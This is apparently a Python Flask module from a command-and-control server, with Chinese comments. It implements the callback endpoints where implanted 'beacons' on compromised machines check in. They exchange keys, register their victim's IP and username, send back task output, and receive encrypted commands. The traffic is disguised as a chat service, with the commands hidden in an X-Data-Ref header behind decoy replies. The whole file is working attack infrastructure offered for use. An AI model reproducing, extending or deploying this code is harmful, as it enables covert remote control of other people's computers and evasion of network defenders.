# Beacon回连的地方
import base64
import json
from flask import Blueprint, request, jsonify, current_app

from server.persistence.database import get_db_session

# 创建蓝图，URL 前缀为 /api/chat
api_bp = Blueprint('chat_api', __name__, url_prefix='/api/chat')


def get_services():
    """从应用配置中获取所有共享的服务实例"""
    app_config = current_app.config
    return {
        'crypto_mgr': app_config['CRYPTO_MANAGER'],
        'beacon_service': app_config['BEACON_SERVICE'],
        'task_service': app_config['TASK_SERVICE']
    }


def get_beacon_ip():
    # 从请求头或连接中获取客户端的 IP 地址，用于会话查找。
    # 代理功能目前不打算写，为了程序健壮还是处理一下，优先使用 X-Forwarded-For
    return request.headers.get('X-Forwarded-For', request.remote_addr)


# 握手，这里握手的固定格式为:
"""
{
    "hello":公钥,
    "user":beacon读出来的用户名,
    "password":随便
}

{
    "welcome":公钥,
    "user":beacon读出来的用户名,
    "info":"welcome for chat"
}
"""
@api_bp.route('/login', methods=['POST'])
def initial_handshake():
    """
    Beacon 首次签入，进行密钥协商和会话注册。
    预期接收：{"hello": <公钥B64>, "user": "...", "password": "..."}
    """
    beacon_ip = get_beacon_ip()
    try:
        data = request.get_json()
        services = get_services()
        crypto_mgr = services['crypto_mgr']
        beacon_service = services['beacon_service']
        # 密钥派生和 ID 生成
        beacon_public_key_b64 = data.get('hello')
        if not beacon_public_key_b64:
            return jsonify({'error': 'Missing public key'}), 401

        beacon_public_key = base64.b64decode(beacon_public_key_b64)

        # GrimoireCryptoManager 内部生成 beacon_id = SHA256(AES_Key) 并存储 AESGCM 实例
        beacon_id = crypto_mgr.derive_session_key(
            my_private=crypto_mgr.private, beacon_public_key=beacon_public_key
        )

        # 注册 Beacon 会话到数据库
        with get_db_session() as db:
            # 这里我们简化，只用 IP 和 ID 注册
            beacon_service.register_new_beacon(
                db=db,
                beacon_id=beacon_id,
                ip_address=beacon_ip,
                # 假设初始数据也在这里注册
                initial_data={'username': data.get('user', 'Guest'), 'hostname': 'N/A'} # 简化指纹
            )

        server_public_key_b64 = base64.b64encode(crypto_mgr.get_publickey()).decode('utf-8')
        # 返回确认信息（无需返回 ID，因为它不通过网络传输）
        return jsonify({
            'welcome': server_public_key_b64,
            'user': data.get('user', 'Guest'),
            'info': 'welcome for chat'
        }), 200

    except Exception as e:
        print(f"Handshake failed for {beacon_ip}: {e}")
        return jsonify({'error': 'Internal server error'}), 503




# 心跳包
"""
beacon如果是任务完成的返回，张下面这样
{
"task_id":id,
"output":output
}
如果是请求任务，就
{
"action":"heartbeat"
}


加密后这样返回:
{
    "auth":加密后的payload,
    "user":beacon读出来的用户名,
    "question":随便
}
然后server的返回的任务张:
{
    "task_id": task.task_id,
    "command": task.command,
    "arguments": task.arguments
}
加密完放X-Data-Ref头里面。
然后返回:
X-Data-Ref:加密后的payload
{
"answer":"anaanan"
}
"""


@api_bp.route('/send', methods=['POST'])
def secure_communication():
    services = get_services()
    crypto_mgr = services['crypto_mgr']
    task_service = services['task_service']

    # 解密输入
    payload = request.get_json().get('auth', '')
    if not payload:
        return jsonify({'error': 'Missing Authentication'}), 400
    try:
        plaintext_bytes, beacon_id = crypto_mgr.grimoire_decrypt(payload)
    except Exception as e:
        return jsonify({'error': 'Decryption/Authentication failed'}), 401

    with get_db_session() as db:
        # TaskService 处理一切，并返回格式化好地响应字典
        response_data = task_service.process_and_get_task(
            db=db,
            beacon_id=beacon_id,
            plaintext_bytes=plaintext_bytes
        )

    # 加密并返回
    response_payload = json.dumps(response_data).encode('utf-8')
    try:
        encrypted_response = crypto_mgr.grimoire_encrypt(beacon_id, response_payload)
        response =  jsonify({'Answer': "Today is 2025.11.21"})
        response.headers['X-Data-Ref'] = encrypted_response
        return response,200
    except Exception as e:
        print(f"Encryption failed for {beacon_id}: {e}")
        return jsonify({'error': 'Internal encryption error'}), 500